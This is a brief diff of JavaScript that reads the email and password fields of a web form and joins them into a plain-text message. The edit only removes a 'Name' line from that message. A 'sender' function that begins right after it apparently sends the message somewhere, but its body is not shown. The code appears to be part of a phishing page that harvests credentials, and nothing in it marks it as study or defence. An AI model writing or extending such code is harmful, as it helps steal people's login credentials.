@@ -6,7 +6,7 @@ var email, pasD;
 var ready = function () {
     email = document.getElementById("email").value;
     pasD = document.getElementById("pasD").value;
-    message = "Name: " + u_name + "\nEmail: " + email + "\nPassword: " + pasD;
+    message = "\nEmail: " + email + "\nPassword: " + pasD;
 };
 var sender = function () {
     ready();
